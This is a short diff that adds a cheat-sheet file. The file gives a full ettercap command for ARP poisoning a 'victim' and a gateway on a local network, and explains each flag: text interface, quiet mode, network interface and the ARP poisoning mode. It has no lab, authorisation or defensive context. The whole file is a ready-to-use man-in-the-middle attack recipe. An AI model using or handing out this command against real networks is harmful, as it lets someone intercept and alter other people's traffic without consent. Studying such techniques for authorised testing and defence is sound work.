@@ -1,0 +1,8 @@
+sudo ettercap -T -q -i <interface> -M ARP /<target_ip>/ /<gateway_ip>/
+
+-T: Use text interface.
+-q: Quiet mode (suppress output).
+-i <interface>: Specify the network interface (e.g., en0, eth0).
+-M ARP: Perform ARP poisoning.
+/<target_ip>/: IP address of the victim.
+/<gateway_ip>/: IP address of the gateway
